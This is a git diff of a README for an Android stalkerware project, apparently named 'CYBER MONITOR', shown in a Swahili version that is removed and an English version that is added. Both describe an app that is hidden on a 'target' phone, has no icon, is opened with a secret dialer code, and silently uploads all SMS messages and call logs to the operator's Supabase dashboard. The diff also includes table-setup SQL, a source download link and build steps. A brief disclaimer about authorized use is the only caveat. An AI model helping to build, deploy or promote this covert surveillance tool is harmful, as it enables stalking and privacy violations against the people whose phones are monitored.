@@ -1,91 +1,111 @@
-# 🔴 TARGET SYNC AGENT – STEALTH EDITION 🔴
+<!-- Glowing Top Border -->
+<p align="center">
+  <img src="https://i.imgur.com/dBaSKWF.gif" height="40" width="100%">
+</p>
 
 <div align="center">
 
-<img src="/file_00000000339c71fd897e55b6a45eb0b2.png" 
-     alt="MR-AUTHOR" 
-     width="160" 
-     style="border: 4px solid #ff0033; border-radius: 12px; 
-            box-shadow: 0 0 20px #ff0033, 0 0 45px #ff3366; 
-            image-rendering: crisp-edges;">
+<strong style="color:#ff0000; font-size: 2em;">🔴 CYBER MONITOR – Stealth Target Tracking 🔴</strong>
+<br>
+<a href="https://git.io/typing-svg">
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&size=40&pause=1000&color=ff0000&center=true&width=800&height=80&lines=Stealth+Target+Tracking;SMS+%26+Call+Logs+Collector;Supabase+Realtime;MR-AUTHOR+Cyber+Weapon" alt="Typing SVG"/>
+</a>
 
-</div>
+<p align="center">
+  <img style="width: 280px; height: 280px; border-radius: 20px; box-shadow: 0 0 30px #ff0000, 0 0 50px rgba(255, 0, 0, 0.5);" src="file_00000000339c71fd897e55b6a45eb0b2.png" alt="MR-AUTHOR Cyber Monitor Icon" />
+</p>
 
-<pre style="color: #ff2222; font-size: 5.5px; line-height: 1.05; text-align: center; margin: 15px 0;">
-███╗   ███╗██████╗     █████╗ ██╗   ██╗████████╗██╗  ██╗ ██████╗ ██████╗   
-████╗ ████║██╔══██╗   ██╔══██╗██║   ██║╚══██╔══╝██║  ██║██╔═══██╗██╔══██╗  
-██╔████╔██║██████╔╝   ███████║██║   ██║   ██║   ███████║██║   ██║██████╔╝  
-██║╚██╔╝██║██╔══██╗   ██╔══██║██║   ██║   ██║   ██╔══██║██║   ██║██╔══██╗  
-██║ ╚═╝ ██║██║  ██║   ██║  ██║╚██████╔╝   ██║   ██║  ██║╚██████╔╝██║  ██║  
-╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝  
-</pre>
+<p align="center" style="color: #ff0000; text-shadow: 0 0 5px #ff0000;">
+  <i>"Silence is the best weapon. Hakuna anayejua, ila mimi."</i>
+</p>
 
-<div align="center">
-  $${\color{#ff0033}\textbf{"Silence is the best weapon. Your data, my command."}}$$
-  
-  — $${\color{#ff3366}MR-AUTHOR}$$
-</div>
+<br>
 
-<div align="center">
-  ⚡ OWNER: 
-  <span style="background:#000000; padding:8px 20px; border:2px solid #ff0033; 
-               color:#ff3366; font-weight:bold; border-radius:4px;">
-    $${\color{#ff0033}MR-AUTHOR}$$
-  </span> 
-  ⚡
+**🚀 DEPLOY DASHBOARD**
+<br>
+<a href="#" target="_blank">
+  <img src="https://img.shields.io/badge/DEPLOY%20DASHBOARD-100000?style=for-the-badge&logo=netlify&logoColor=white&labelColor=darkred&color=darkred" alt="Deploy Dashboard"/>
+</a>
+
+<br>
+
+**📱 GET TARGET APK**
+<br>
+<a href="#" target="_blank">
+  <img src="https://img.shields.io/badge/BUILD%20APK-100000?style=for-the-badge&logo=android&logoColor=white&labelColor=darkred&color=darkred" alt="Build APK"/>
+</a>
+
+<br>
+
+**📦 DOWNLOAD SOURCE ZIP**
+<br>
+<a href="https://github.com/omari143/SPYZONE/archive/refs/heads/main.zip" target="_blank">
+  <img src="https://img.shields.io/badge/DOWNLOAD%20ZIP-100000?style=for-the-badge&logo=github&logoColor=white&labelColor=darkred&color=darkred" alt="Download zip"/>
+</a>
+
+<br>
+
+![GitHub stars](https://img.shields.io/badge/stars-★★★★★-darkred?style=for-the-badge)
+![GitHub forks](https://img.shields.io/badge/forks-CLASSIFIED-darkred?style=for-the-badge)
+![GitHub repo size](https://img.shields.io/badge/size-2.3MB-darkred?style=for-the-badge)
+
 </div>
 
 ---
 
-### 🔥 KAZI YA PROGRAMU – STEALTH MODE
+## What is CYBER MONITOR?
 
-Programu inafanya kazi **bila icon yoyote** kwenye simu ya target (full stealth).  
-Inazinduliwa kwa siri kwa kupiga **`*#12345#`** kwenye dialer.
+**CYBER MONITOR** is a **stealth target tracking system** built by **MR-AUTHOR**. It consists of two main components:
 
-Inakusanya na kupeleka data moja kwa moja kwenye **Supabase** yako kwa wakati halisi:
+1. **Target App (Android)** – Installed on the target device. It runs in **stealth mode** (no icon, hidden from launcher). Collects **all incoming/outgoing SMS messages** and **call logs** (caller, duration, timestamp) in real time, then syncs them to a **Supabase** database.
 
-- ✅ **SMS zote** — mtumaji, ujumbe kamili, timestamp  
-- ✅ **Call Logs kamili** — namba, aina (incoming/outgoing/missed), muda, duration  
+2. **Dashboard** – A web interface (HTML/JS) that allows the operator to **sign up / log in** and view the collected data in real time. Supports filtering, searching, and exporting to CSV.
 
-Unaweza kuziona na kuzidownload kupitia dashboard yako yenye login/signup.
+> ⚠️ **For educational & authorized use only.** Unauthorized surveillance is illegal in most countries.
 
 ---
 
-### 🧠 MANTIKI YA UFANYAKAZI
+## 📸 Screenshots (Dashboard Preview)
 
-| Kipengele              | Maelezo |
-|------------------------|--------|
-| **Stealth Mode**       | Haina icon. Inazinduliwa kwa *#12345# kwenye dialer. |
-| **Ruhusa**             | Inaomba SMS & Call Logs permissions mara moja tu. |
-| **Initial Sync**       | Inasoma data yote iliyopo na kupeleka Supabase mara inapoanza. |
-| **Auto-Sync**          | Kila baada ya dakika 15 au unapobonyeza SYNC button. |
-| **Offline Handling**   | Inahifadhi data na kuisync moja kwa moja mtandao unaporudi. |
-| **Realtime Events**    | Inasikiliza SMS mpya au simu na kusync mara moja. |
+<p align="center">
+  <img src="IMG-20260414-WA0009.jpg" alt="SMS Logs" width="280" style="border-radius: 10px; box-shadow: 0 0 15px red;"/>
+  &nbsp;
+  <img src="IMG-20260414-WA0010.jpg" alt="Call Logs" width="280" style="border-radius: 10px; box-shadow: 0 0 15px red;"/>
+</p>
+
+> *Make sure the images `IMG-20260414-WA0009.jpg` and `IMG-20260414-WA0010.jpg` are in the same folder as this README (or adjust the path).*
 
 ---
 
-### 🗃️ SUPABASE SETUP (LAZIMA KABLA YA BUILD APK)
+## ✨ Features
 
-Tengeneza meza hizi kwenye Supabase yako **kabla** ya kujenga APK:
+- **Stealth Android Agent** – No app icon, invisible in recent apps, triggered by secret dialer code `*#12345#`.
+- **SMS Collection** – Captures sender, message body, timestamp, and message type (sent/received).
+- **Call Log Collection** – Captures phone number, call type (incoming/outgoing/missed), duration, and timestamp.
+- **Supabase Backend** – Real-time database with row-level security (RLS). Each user has isolated data.
+- **Web Dashboard** – Modern, responsive interface with authentication (signup/login), live updates via Supabase subscriptions, search/filter, and CSV export.
+- **Secure** – Passwords hashed, API keys restricted, environment variables hidden.
+- **Easy Deployment** – Dashboard can be hosted on Netlify, Vercel, or any static server. Target app built with Capacitor.
 
-```sql
--- Jedwali la SMS
-CREATE TABLE sms (
-  id SERIAL PRIMARY KEY,
-  sender TEXT,
-  body TEXT,
-  created_at TIMESTAMPTZ DEFAULT NOW()
-);
+---
 
--- Jedwali la Call Logs
-CREATE TABLE call_logs (
-  id SERIAL PRIMARY KEY,
-  number TEXT,
-  type TEXT CHECK (type IN ('incoming', 'outgoing', 'missed')),
-  duration INT,
-  created_at TIMESTAMPTZ DEFAULT NOW()
-);
+## ⚙️ Requirements
 
--- Zima RLS kwa majaribio (baadaye weka security)
-ALTER TABLE sms DISABLE ROW LEVEL SECURITY;
-ALTER TABLE call_logs DISABLE ROW LEVEL SECURITY;
+### For Target App (APK Building)
+- Node.js (v18+)
+- Android Studio (with SDK, NDK)
+- Capacitor CLI
+- Supabase account (free tier works)
+
+### For Dashboard
+- Any modern web browser (Chrome, Firefox, Edge)
+- Supabase project (same as above)
+
+---
+
+## 🚀 Installation & Setup
+
+### 1. Clone the repository
+```bash
+git clone https://github.com/omari143/SPYZONE.git
+cd SPYZONE
